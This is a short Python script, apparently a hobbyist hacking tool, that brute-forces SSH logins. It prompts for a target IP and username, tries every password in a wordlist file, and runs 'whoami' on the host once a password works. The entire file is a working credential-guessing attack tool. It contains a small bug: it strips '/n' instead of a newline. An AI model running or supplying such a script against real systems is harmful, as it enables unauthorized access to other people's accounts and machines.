#!/usr/bin/python3

import pexpect
from termcolor import colored
from sshLogin import connect, send_command

def main():
   host = input(colored('[+] Enter the ip address you want to bruteforce : ', 'green'))
   user = input(colored('[+] Enter the user you want to bruteforce : ', 'green'))
   file = open('passwords.txt', 'r')
   for passwd in file.readlines():
      passwd = passwd.strip('/n')
      try:
         child = connect(host, user, passwd)
         print(colored('[+] Password found : ' + passwd, 'green'))
         send_command(child, 'whoami')
      except:
         print(colored('[-] Wrong Password : ' + passwd, 'red'))

if __name__ == '__main__':
   main()
